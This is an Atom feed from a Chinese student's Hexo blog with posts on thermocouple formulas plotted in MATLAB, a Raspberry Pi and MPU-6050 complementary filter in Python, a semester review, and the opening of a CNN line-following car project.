<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦的小窝</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hsmouc.com/"/>
  <updated>2017-03-21T08:15:50.000Z</updated>
  <id>https://hsmouc.com/</id>
  
  <author>
    <name>Hsmouc</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>热电偶学习笔记--原理与使用</title>
    <link href="https://hsmouc.com/2017/03/21/2017-03-21-thermocouple/"/>
    <id>https://hsmouc.com/2017/03/21/2017-03-21-thermocouple/</id>
    <published>2017-03-21T03:36:18.000Z</published>
    <updated>2017-03-21T08:15:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>这学期<strong>过程控制</strong>课介绍了热电偶的相关知识，相对于<strong>检测技术</strong>课程更偏向于热电偶的实际应用。这篇文章将会介绍热电偶的基本原理和使用方法，介绍如何使用K型热电偶的正向/反向公式，并用MATLAB绘制SEEBACK曲线。</p>
<a id="more"></a>
<h2 id="热电偶原理简介"><a href="#热电偶原理简介" class="headerlink" title="热电偶原理简介"></a>热电偶原理简介</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><ul>
<li>以下内容参考 <em>过程控制系统/清华大学出版社</em></li>
</ul>
<blockquote>
<p>热电偶是一种感温元件，是一次仪表，它直接测量温度，并把温度信号转换成电动势信号。热电偶是由两根不同的导体组成的，当两端温度不同时就会有<strong>热电势</strong>产生。</p>
</blockquote>
<p><em>P.S：</em>热电势包括接触电势和温差电势两部分，由于温差电势比接触电势小得多，故主要考虑接触电势。<br><em>P.S：</em>接触电势是指两种不同材质的导体A，B接触时两边自由电子的密度不同，在交界面上产生电子相互扩散的电势。</p>
<h3 id="三个结论"><a href="#三个结论" class="headerlink" title="三个结论"></a>三个结论</h3><ul>
<li>热电偶的两个热电极必须是两种不同材料的均质导体，否则热电偶回路的总电动势为零。</li>
<li>热电偶两接合点的温度必须不等，否则热电偶回路的总热电势为零。</li>
<li>热电偶A，B产生的热电势只与两个接点温度有关，而与中间温度无关，与热电偶的材料有关，和热电偶的尺寸形状无关。</li>
</ul>
<h2 id="热电偶的应用"><a href="#热电偶的应用" class="headerlink" title="热电偶的应用"></a>热电偶的应用</h2><p>下面这张图是一个较为完整的热电偶测温系统，是我根据课堂笔记在<a href="https://www.draw.io" target="_blank" rel="external">Draw App</a>上面绘制的。这张图漏画了一个低通滤波器，主要是为了解决10KHz的射频干扰问题。<br><img src="http://ok4omea8a.bkt.clouddn.com/thermocouple.jpg" alt="测温系统"></p>
<h3 id="补偿导线"><a href="#补偿导线" class="headerlink" title="补偿导线"></a>补偿导线</h3><p>因为热电偶一般都是贵金属，在远距离测量时为了节约成本所以需要补偿导线。补偿导线在一段温度范围内与所匹配的热电偶热电势标称值相同，而且价格比热电偶本身便宜很多，延长了热电偶的冷端。使用补偿导线的理论基础是中间温度定律。</p>
<h3 id="滤波及放大器"><a href="#滤波及放大器" class="headerlink" title="滤波及放大器"></a>滤波及放大器</h3><ul>
<li>上图测温系统应该有两处滤波，第一处在运放之前，使用低通滤波器消除射频干扰，经由运放后需要滤波器滤去工频50Hz的杂波干扰。</li>
<li>使用的差分放大器需要满足<strong>高输入阻抗</strong>和<strong>低偏置电流</strong>两个特点。（大高输入阻抗可以有效减小流过热电偶的电流，这样就避免了热电偶自发热对测温准确度的影响）</li>
</ul>
<h3 id="热电偶分度表和正-反向公式使用"><a href="#热电偶分度表和正-反向公式使用" class="headerlink" title="热电偶分度表和正/反向公式使用"></a>热电偶分度表和正/反向公式使用</h3><p>首先推荐一个很有用的网站<a href="https://srdata.nist.gov/its90/download/download.html" target="_blank" rel="external">NIST</a>在这里可以查看各种型号的热电偶温度与电压的对应表。表格的样子如下：<br><img src="http://ok4omea8a.bkt.clouddn.com/table.png" alt="表格"><br>网站还给出了两个公式如下：<br><img src="http://ok4omea8a.bkt.clouddn.com/Function.png" alt="公式"><br>我们可以用MATLAB绘制“温度-输出热电势”，“输出热电势-温度”，“赛贝克(seeback)系数曲线”曲线。下面是MATLAB程序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">a0 =  <span class="number">0.118597600000E+00</span></div><div class="line">a1 = <span class="number">-0.118343200000E-03</span></div><div class="line">a2 =  <span class="number">0.126968600000E+03</span></div><div class="line">c_i_1 = [<span class="number">0.000000000000E+00</span> <span class="number">0.394501280250E-01</span> <span class="number">0.236223735980E-04</span> <span class="number">-0.328589067840E-06</span> <span class="number">-0.499048287770E-08</span> <span class="number">-0.675090591730E-10</span> <span class="number">-0.574103274280E-12</span> <span class="number">-0.310888728940E-14</span> <span class="number">-0.104516093650E-16</span> <span class="number">-0.198892668780E-19</span> <span class="number">-0.163226974860E-22</span>]</div><div class="line">c_i_2 = [<span class="number">-0.176004136860E-01</span> <span class="number">0.389212049750E-01</span> <span class="number">0.185587700320E-04</span> <span class="number">-0.994575928740E-07</span> <span class="number">0.318409457190E-09</span> <span class="number">-0.560728448890E-12</span> <span class="number">0.560750590590E-15</span> <span class="number">-0.320207200030E-18</span> <span class="number">0.971511471520E-22</span> <span class="number">-0.121047212750E-25</span>]</div><div class="line">t_1 = <span class="number">-270</span>:<span class="number">0</span></div><div class="line">t_2 = <span class="number">1</span>:<span class="number">1370</span></div><div class="line">E_1 = <span class="number">0</span></div><div class="line">E_2 = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i = <span class="number">1</span>:length(c_i_1)</div><div class="line">    E_1 = E_1 + c_i_1(i) * t_1.^(i<span class="number">-1</span>)</div><div class="line">end</div><div class="line"></div><div class="line"><span class="keyword">for</span> i = <span class="number">1</span>:length(c_i_2)</div><div class="line">    E_2 = E_2 + c_i_2(i) * t_2.^(i<span class="number">-1</span>)</div><div class="line">end</div><div class="line"></div><div class="line">E_2 = E_2 + a0*exp(a1 * (t_2 - a2).^<span class="number">2</span>)</div><div class="line">t = [t_1 t_2]</div><div class="line">E = [E_1 E_2]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i = <span class="number">1</span>:length(E)<span class="number">-1</span></div><div class="line">    err(i) = E(i+<span class="number">1</span>)-E(i)</div><div class="line">end</div><div class="line"></div><div class="line">T = <span class="number">-270</span>:<span class="number">1369</span></div><div class="line">plot(T,err)</div><div class="line">plot(t,E)</div><div class="line">xlabel(<span class="string">'TEMPERATURE(?C)'</span>)</div><div class="line">ylabel(<span class="string">'SEEBECK COEFFICIENT -?V/?C'</span>)</div><div class="line">title(<span class="string">'THERMOCUPLE SEEBECK COEFFICIENT VERSUS TEMPERATURE'</span>)</div></pre></td></tr></table></figure>
<p>以上是正向公式的使用和绘制SEEBACK曲线，下面是反向公式的使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">d_i = [-1.318058E+02 4.830222E+01 -1.646031E+00 5.464731E-02 -9.650715E-04 8.802193E-06 -3.110810E-08 0.000000E+00 0.000000E+00 0.000000E+00]</div><div class="line">t = 0</div><div class="line">E = 20.644:0.1:54.886</div><div class="line">E = 31.213</div><div class="line">for i = 1:10</div><div class="line">    t = t + d_i(i)*E.^(i-1) </div><div class="line">end</div><div class="line">plot(E,t)</div></pre></td></tr></table></figure>
<p>这里给出的电压区间是<code>20.644V~54.886V</code>，其他区间程序同理，相应地更改<code>d_i</code>就可以了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这学期&lt;strong&gt;过程控制&lt;/strong&gt;课介绍了热电偶的相关知识，相对于&lt;strong&gt;检测技术&lt;/strong&gt;课程更偏向于热电偶的实际应用。这篇文章将会介绍热电偶的基本原理和使用方法，介绍如何使用K型热电偶的正向/反向公式，并用MATLAB绘制SEEBACK曲线。&lt;/p&gt;
    
    </summary>
    
      <category term="传感器" scheme="https://hsmouc.com/categories/%E4%BC%A0%E6%84%9F%E5%99%A8/"/>
    
    
      <category term="MATLAB" scheme="https://hsmouc.com/tags/MATLAB/"/>
    
      <category term="Sensor" scheme="https://hsmouc.com/tags/Sensor/"/>
    
  </entry>
  
  <entry>
    <title>角度融合算法</title>
    <link href="https://hsmouc.com/2017/02/06/2017-02-06-pi/"/>
    <id>https://hsmouc.com/2017/02/06/2017-02-06-pi/</id>
    <published>2017-02-06T03:16:18.000Z</published>
    <updated>2017-02-06T04:42:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>在这篇文章里我用Python实现了一个简单的互补滤波器来做角度融合，实现姿态解算。用到的传感器是<a href="https://www.invensense.com/products/motion-tracking/6-axis/mpu-6050/" target="_blank" rel="external">MPU-6050</a>，使用树莓派的I2C总线读取传感器的底层数据。</p>
<a id="more"></a>
<ul>
<li>这篇文章的大部分内容来源于我这学期的期末作业，题目是<em>平衡车角度融合算法探究</em>。当时的方案是：<strong>单片机+模拟加速度陀螺仪传感器，C语言单片机编程</strong>。考虑到当时没有上位机所以无法观察滤波的效果，所以我尝试用<code>smbus</code>使用I2C总线读取数据，用<code>matplotlib</code>绘图检验滤波器的性能。</li>
</ul>
<h3 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h3><ul>
<li>Raspberry 3 Model B ／ Ubuntu 16.04（ARM）</li>
<li>MPU-6050</li>
</ul>
<p><img src="http://ok4omea8a.bkt.clouddn.com/IMG_5309.JPG" alt="系统图"></p>
<p>MPU-6050和树莓派之间通过I2C总线相连，并由PI供电(5V)。</p>
<p><img src="http://ok4omea8a.bkt.clouddn.com/MPU6050.jpg" alt="MPU-6050"></p>
<h3 id="角度融合算法"><a href="#角度融合算法" class="headerlink" title="角度融合算法"></a>角度融合算法</h3><h4 id="加速度计"><a href="#加速度计" class="headerlink" title="加速度计"></a>加速度计</h4><blockquote>
<p>加速度计测量的是加速度，为什么可以测量角度呢？   </p>
</blockquote>
<p>加速度计主要测量的是测量设备的受力情况，也就是三轴运动情况，设计原理适合于空间运动判断。我们把加速度计想象成一个正方体盒子，里面放着一颗直径和盒子边长相等的球体。假设我们把盒子放在水平桌面上，那么仅有垂直方向会受到球的挤压，这时传感器对应垂直方向的接口就会输出相对应的电压。也就是说，加速度传感器是一种力传感器。<br>既然加速度计可以感应轴上的压力大小，那么牛顿早在400年前提出得力学定律就可以派上用场了。我们现在要计算倾斜角。三轴可以确定一个空间位置，计算任意一个平面与夹角并不复杂，这里我只算一个轴的角度，所以我们只需要知道加速度计上两个方向的分力即可。</p>
<h4 id="陀螺仪"><a href="#陀螺仪" class="headerlink" title="陀螺仪"></a>陀螺仪</h4><p>陀螺仪的作用是测角速度，我们很自然的联想到，若我这个角速度进行积分运算，就可以得到我们需要的角度了。</p>
<h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><p>有资料提到陀螺仪的数据需要除以131，原因是芯片资料上有这个参数:</p>
<table>
<thead>
<tr>
<th>Parameter</th>
<th style="text-align:center">Conditions</th>
<th style="text-align:right">TYP</th>
<th style="text-align:right">Unit</th>
</tr>
</thead>
<tbody>
<tr>
<td>Sensitivity Scale Factor</td>
<td style="text-align:center">FS_SEL=0</td>
<td style="text-align:right">131</td>
<td style="text-align:right">LSB</td>
</tr>
<tr>
<td></td>
<td style="text-align:center">FS_SEL=1</td>
<td style="text-align:right">65.5</td>
<td style="text-align:right">LSB</td>
</tr>
<tr>
<td></td>
<td style="text-align:center">FS_SEL=2</td>
<td style="text-align:right">32.8</td>
<td style="text-align:right">LSB</td>
</tr>
<tr>
<td></td>
<td style="text-align:center">FS_SEL=3</td>
<td style="text-align:right">16.4</td>
<td style="text-align:right">LSB</td>
</tr>
</tbody>
</table>
<p>这里参考的文章是<a href="http://www.geek-workshop.com/thread-10172-1-1.html" target="_blank" rel="external">MPU6050数据采集及其意义和滤波</a>，其主要意义在于选择合适的量程。</p>
<h4 id="为何要使用角度融合算法"><a href="#为何要使用角度融合算法" class="headerlink" title="为何要使用角度融合算法"></a>为何要使用角度融合算法</h4><p>你可能会问加速度计不是可以计算角度嘛，那为什么还要多此一举使用陀螺仪呢？要解决这个问题，首先要对这两种传感器有更深刻的理解。<br>被测物体在运动过程中难免会发生一些抖动，还是联想上文提到的盒子的模型，试想，若你的盒子在不停的振动，六个面的压力会如何变化？也就是说，在我们使用加速度传感器求角度的时候结果中包含了一些噪声，且加速度计动态响应慢。再看陀螺仪，这种传感器是用来测量角速度的，我们对它积分可以求出角度。然而由于自身的硬件特性，陀螺仪存在温度漂移，陀螺仪计算出的角度误差会随时间增大，我们同样不希望出现这种结果。</p>
<h3 id="简单实用的互补滤波"><a href="#简单实用的互补滤波" class="headerlink" title="简单实用的互补滤波"></a>简单实用的互补滤波</h3><h3 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h3><h4 id="简单却实用的互补滤波"><a href="#简单却实用的互补滤波" class="headerlink" title="简单却实用的互补滤波"></a>简单却实用的互补滤波</h4><ul>
<li>互补滤波的理论基础  </li>
</ul>
<p>首先我们先来复习一下两个概念：</p>
<ol>
<li>低通滤波器</li>
<li>高通滤波器</li>
<li>带通滤波器  </li>
</ol>
<blockquote>
<p>低通滤波器（英语：Low-pass filter）容许低频信号通过，但减弱（或减少）频率高于截止频率的信号的通过。’低’和’高’频率的含义，是相对于滤波器设计者所选择的截止频率而言的。<br>高通滤波器则相反，而带通滤波器则是高通滤波器和低通滤波器的组合。</p>
</blockquote>
<p>互补滤波器其实就是一种带通滤波器的变种。</p>
<ul>
<li>积分器  </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">angle += gyro*dt;</div></pre></td></tr></table></figure>
<p>其中，<code>angle</code>为角度，<code>gyro</code>为陀螺仪角速度，<code>dt</code>为计算周期。<code>gyro*dt</code> 得到计算周期时间段内通过的角度，通过对该角度的积分（不断累加），得到系统运行以来的角度。  </p>
<ul>
<li>低通滤波器 </li>
</ul>
<p>低通滤波器的目标是过滤掉短期波动，让长期变化得以保留。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">angle = (<span class="number">0.98</span>)*angle_last + (<span class="number">0.02</span>)*x_acc;</div></pre></td></tr></table></figure>
<p>其中，<code>angle</code>为当前角度，<code>angle_last</code>为前一次角度，<code>x_acc</code>为当前加速度计换算后的角度值。对<code>x_acc</code>进行低通滤波，让加速度计的长期变化得以保留，<code>angle</code>能追踪加速度计的长期变化。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>首先可以用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i2cdetect -y <span class="number">1</span> <span class="comment">#0</span></div></pre></td></tr></table></figure>
<p>来判断芯片的地址，MPU-6050的芯片地址是<code>0x68</code> ，用Python实现I2C 读写需要使用<a href="https://pypi.python.org/pypi/smbus-cffi/0.5.1" target="_blank" rel="external">smbus-cffi</a>，按照官网的教程安装即可。加速度计和陀螺仪的寄存器地址可以在<a href="http://www.invensense.com/wp-content/uploads/2015/02/MPU-6000-Register-Map1.pdf" target="_blank" rel="external">MPU-6050 Register Map and Descriptions - InvenSense</a>查到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> smbus</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"></div><div class="line">bus = smbus.SMBus(<span class="number">1</span>)</div><div class="line"></div><div class="line">address = <span class="number">0x68</span></div><div class="line"></div><div class="line">ACCEL_XOUT_H_Addr = <span class="number">0x3B</span></div><div class="line">ACCEL_XOUT_L_Addr = <span class="number">0x3C</span></div><div class="line">ACCEL_ZOUT_H_Addr = <span class="number">0x3F</span></div><div class="line">ACCEL_ZOUT_L_Addr = <span class="number">0x40</span></div><div class="line">GYRO_YOUT_H_Addr = <span class="number">0x45</span></div><div class="line">GYRO_YOUT_L_Addr = <span class="number">0x46</span></div><div class="line"></div><div class="line">accel = <span class="number">0</span></div><div class="line">angle = <span class="number">0</span></div><div class="line">count = <span class="number">0</span></div><div class="line">PI = <span class="number">3.1415926</span></div><div class="line">Ydata_1 = []</div><div class="line">Ydata_2 = []</div><div class="line"></div><div class="line"><span class="comment"># 传感器数据处理</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sensor_data</span><span class="params">(addr_L,addr_H)</span>:</span></div><div class="line">        data_L = bus.read_byte_data(address,addr_L)</div><div class="line">        data_H = bus.read_byte_data(address,addr_H)</div><div class="line">        <span class="keyword">if</span> data_H &gt; <span class="number">128</span>:</div><div class="line">                <span class="keyword">return</span> (data_H - <span class="number">256</span>) * <span class="number">255</span> + data_L</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">return</span> data_H * <span class="number">255</span> + data_L</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">                accel = atan2(sensor_data(ACCEL_XOUT_L_Addr,ACCEL_XOUT_H_Addr),sensor_data(ACCEL_ZOUT_L_Addr,ACCEL_ZOUT_H_Addr))*<span class="number">180</span>/PI</div><div class="line">                angle = <span class="number">0.95</span>*(angle + <span class="number">0.1</span> * sensor_data(GYRO_YOUT_L_Addr,GYRO_YOUT_H_Addr)/<span class="number">131</span>)+<span class="number">0.05</span>*accel</div><div class="line">                count = count + <span class="number">1</span></div><div class="line">                time.sleep(<span class="number">0.1</span>) <span class="comment">#采样周期为0.1s</span></div><div class="line">        <span class="keyword">except</span> IOError: <span class="comment">#抛IOError异常不去管它继续执行</span></div><div class="line">                <span class="keyword">continue</span> </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> angle,gyro</div><div class="line">                Ydata_1.append(accel)</div><div class="line">                Ydata_2.append(angle)</div><div class="line">                <span class="keyword">if</span> count == <span class="number">100</span>: <span class="comment">#采样100次</span></div><div class="line">                        <span class="keyword">break</span>  </div><div class="line"></div><div class="line">plt.plot(Ydata_1)</div><div class="line">plt.plot(Ydata_2) </div><div class="line">plt.show()</div></pre></td></tr></table></figure>
<p>程序运行的结果如下：<br><img src="http://ok4omea8a.bkt.clouddn.com/plot1.jpg" alt="角度曲线">绿色的曲线是加速度计得到的角度，而蓝色的线是经过互补滤波后得到的角度。从这个曲线上可以看出来互补滤波器的效果还是比较好的。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我在最开始的时候并不明白所谓的卡尔曼滤波为何物，不过把它当作一个黑盒用也没有出现什么奇怪的问题。直到今天我仍然不懂卡尔曼滤波的原理，不过既然我们会互补滤波，那么为什么不用呢？仅仅需要一行代码，效果和卡尔曼滤波几乎完全相同，计算量要比卡尔曼滤波小的多。不过以后的专业课肯定会讲到各种滤波器，卡尔曼滤波这个坑估计迟早得跳吧(｡ì _ í｡)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在这篇文章里我用Python实现了一个简单的互补滤波器来做角度融合，实现姿态解算。用到的传感器是&lt;a href=&quot;https://www.invensense.com/products/motion-tracking/6-axis/mpu-6050/&quot;&gt;MPU-6050&lt;/a&gt;，使用树莓派的I2C总线读取传感器的底层数据。&lt;/p&gt;
    
    </summary>
    
      <category term="编程学习" scheme="https://hsmouc.com/categories/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Python" scheme="https://hsmouc.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>大三上学期总结</title>
    <link href="https://hsmouc.com/2017/01/24/2017-01-24-summary/"/>
    <id>https://hsmouc.com/2017/01/24/2017-01-24-summary/</id>
    <published>2017-01-23T23:29:18.000Z</published>
    <updated>2017-01-24T00:44:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>不知不觉一学期又过去了，简单回忆和总结一下这学期的收获吧。  </p>
<a id="more"></a>
<h3 id="学科竞赛方面"><a href="#学科竞赛方面" class="headerlink" title="学科竞赛方面"></a>学科竞赛方面</h3><p>这学期搞过的大概有三个竞赛。<br>首先是<a href="http://www.smartcar.au.tsinghua.edu.cn/" target="_blank" rel="external">智能车比赛</a>。这个比赛现在年年换主办方所以我也不知道具体叫什么名字了。我和我的组员还是选择了平衡组，大概是因为去年做了一年看上去比较有经验吧。今年比赛规则出的比较晚，由于要准备期末考试大家都没有心情搞车。我们做好了硬件，又稍微整理了一下去年比赛用的代码，现在车子的平衡环和速度环基本已经完成，但貌似摄像头的硬件电路还有问题。</p>
<hr>
<p>我还参加了一个赛程比较短的山东省机器人竞赛，当时还写了一篇<a href="http://hsmouc.com/2016/10/22/2016-10-22-robot/">六足机器人技术报告</a>。机器人大概是这个样子:<br><img src="http://ok4omea8a.bkt.clouddn.com/robot.jpg" alt="机器人">比赛的结果不是很理想，在竞速方面因为0.1s的差距和第一名失之交臂；创意表演方面就更失败了，貌似是因为违反了规则所以拿了三等奖最后一名。这里我就不得不吐槽一下了，这个比赛的设置还是有些不合理的地方，例如竞速比赛的时间是用人工秒表计时的，所以比赛的结果看起来就不是那么公正；创意表演方面的评分完全是主观的，几乎所有的机器人都选择去跳个舞什么的，而我们改了它的机械结构设计了避障和爬坡方案。改机械结构确实我们犯规在先，但是评委对我们方案的态度实在是让人很不爽。我个人认为机器人总应该能做点实实在在的事情，而不是动动舵机跳个舞什么的。毕竟六足机器人的优势就在于它的复杂地形通过性好。考虑到又不是什么大型的比赛，还是不要在意成绩了，学到点东西就好。  </p>
<hr>
<p>最后就是现在正在搞的<a href="http://www.comap.com/undergraduate/contests/" target="_blank" rel="external">Mathematical Contest in Modeling</a>，也就是数学建模的美赛。小学期的时候参加了国赛并且拿了省一等奖，我们研究了开放小区对城市道路通行效率的影响，主要考虑的是三个方面：最短路(<a href="https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm" target="_blank" rel="external">Dijkstra’s algorithm</a>)，Braess悖论和BA无标度网络。但我感觉美赛就没有用那么多的精力，每天按时睡觉还起床困难，日常打两把DotA2。结果当然现在还不知道，但我感觉不会太好。我们选择的题目是机场安检流程优化，用了Petri Net理论。模型计算用了一个叫做<a href="http://sarahtattersall.github.io/PIPE/" target="_blank" rel="external">PIPE</a>的仿真软件。如果不是它我估计美赛就搞不出来了。这是我们建的模型：  </p>
<p><img src="http://ok4omea8a.bkt.clouddn.com/pipejpg" alt="PIPE"></p>
<ul>
<li>综上我觉得自己在智能车和机器人方面没有太大的进步，在数学建模方面由于系统的学习了MATLAB语言，至少说用MATLAB画图比以前好看多了。</li>
</ul>
<hr>
<h3 id="自己做的东西"><a href="#自己做的东西" class="headerlink" title="自己做的东西"></a>自己做的东西</h3><p>感觉自己一学期都在和树莓派打交道。<br>首先是机器人实验课，我用树莓派搭了一个雨伞租赁系统，具体代码与过程我写在<a href="http://hsmouc.com/2016/11/26/2016-11-26-pi/">这篇文章</a>里了。学会了用C语言操作MySQL数据库，熟练掌握了wiringPi的库函数。<br>还有就是关于智能小车方面的设计。我用树莓派和python的CV库做了一个循迹小车，虽说跑起来歪歪扭扭，但是操作系统级的编程要比单片机舒服好多，我觉得这个还有提升的空间。另外，就是把小车的循迹数据拿回来训练神经网络了。这个属于机器学习方面的内容，训练得出的结果还是比较令人满意的。通过这么一折腾，我大概了解了Python的基本语法，学习了正则表达式和matplotlib绘图的相关知识。另外学了神经网络的一些皮毛，如果下学期自己的时间充裕的话会更深入的了解机器学习。<br>SRDP项目顺利结题了，大概就是部署服务器之类的事情，做了一个学校的小网站和<a href="bbs.hsmouc.com">论坛</a>。学了一些HTML/CSS/JS的皮毛，学会了Nginx的部署与配置。</p>
<h3 id="专业课程方面"><a href="#专业课程方面" class="headerlink" title="专业课程方面"></a>专业课程方面</h3><p>这学期专业课考的还行吧，除了电力电子技术没到80，其他的科目都在85以上，自控原理和电机拖动90+。讲道理我感觉自己真的不太喜欢各种电，从电路到模电到数电到电力电子，除了一门数电85+以外其他的都没到80（￣+ー￣）。电力电子技术的话整流学了大半学期，逆变斩波变频感觉我掌握的确实不是很好，考试填空简单估计吃了不少亏。貌似下学期还有大学最后一门电类的专业课，先祝自己好运吧╮(￣▽￣””)╭</p>
<h3 id="其他方面"><a href="#其他方面" class="headerlink" title="其他方面"></a>其他方面</h3><p>体育锻炼是需要的，貌似学校体育课和体测越来越严格了。一学期不跑步被强行要求体测1000m感觉身体确实吃不消。<br>另外我觉得应该减少喝可乐的频率，每次写代码都想喝可乐是个不好的习惯。<br>感情生活方面，虽然中间由于我作死出了一些波折，现在回到正常轨道了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不知不觉一学期又过去了，简单回忆和总结一下这学期的收获吧。  &lt;/p&gt;
    
    </summary>
    
      <category term="杂项" scheme="https://hsmouc.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="summary" scheme="https://hsmouc.com/tags/summary/"/>
    
  </entry>
  
  <entry>
    <title>基于卷积神经网络(CNN)的智能循迹小车</title>
    <link href="https://hsmouc.com/2016/12/31/2016-12-31-pi/"/>
    <id>https://hsmouc.com/2016/12/31/2016-12-31-pi/</id>
    <published>2016-12-31T13:12:15.000Z</published>
    <updated>2017-01-01T06:20:32.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>上篇文章讲到了用树莓派和openCV库来做简单的循迹，在这篇文章里我们将尝试用树莓派做一些更酷的事情。我们不希望给小车具体的规则(explicitly programmed)去做循迹，而是让它自己从已有的数据集(包括图像与转向角)学习如何循迹，没错这就是机器学习。</p>
<a id="more"></a> 
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3></li>
<li>首要要提到的是，我还有一些坑没有填完，这条路并没有完全走通。还没有解决的问题是：<strong>我使用的Google Tensorflow不支持ARM架构的CPU，所以理论上没有办法在树莓派上训练和使用神经网络算法。</strong><br>模型是在x64的ubuntu上训练出来的。在这篇文章里不会详细介绍机器学习以及卷积神经网络算法的原理，而是侧重于说明功能的实现。<h4 id="硬件要求"><a href="#硬件要求" class="headerlink" title="硬件要求"></a>硬件要求</h4></li>
</ul>
<ol>
<li>Raspberry Pi 3</li>
<li>至少4GB内存的计算机 Intel x64架构<h4 id="软件部分"><a href="#软件部分" class="headerlink" title="软件部分"></a>软件部分</h4></li>
<li>Python 2.7</li>
<li>Google Tensorflow/TFlearn</li>
<li>OS:ubuntu ARM 16.04/ubuntu x64 16.04<h4 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h4>循迹赛道上篇文章介绍过这里不再附图解释。<br>第一部分是数据的采集，思路是利用Python的定时器按固定周期拍照，拍完照片做两件事情：</li>
</ol>
<ul>
<li>处理图像，灰度化由阈值判断赛道边界，并求出合理转向角。</li>
<li>储存图像和转向角。<br>第二部分是由采集的数据训练神经网络，并观察误差情况。<br>第三部分则是使用模型，将摄像头实时拍到的图像传进模型，并有模型预测出转向情况，操纵舵机转向。</li>
</ul>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><h5 id="训练数据采集"><a href="#训练数据采集" class="headerlink" title="训练数据采集"></a>训练数据采集</h5><p>第一部分图像的处理并求转向角在前一篇文章中已经介绍。所以在这里只补充一下数据的存储规则。<br>数据的存储规则是我自己订的，独一无二。好吧，我承认它很傻:-I。机器学习界广泛使用的数据存储格式是<code>.csv</code>，可是我是一个Python渣呀，我的具体代码是这样子的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fn = <span class="string">'img/'</span>+str(i)+<span class="string">'_'</span>+str(err)+<span class="string">'.jpg'</span></div><div class="line">cv2.imwrite(fn, im)</div></pre></td></tr></table></figure>
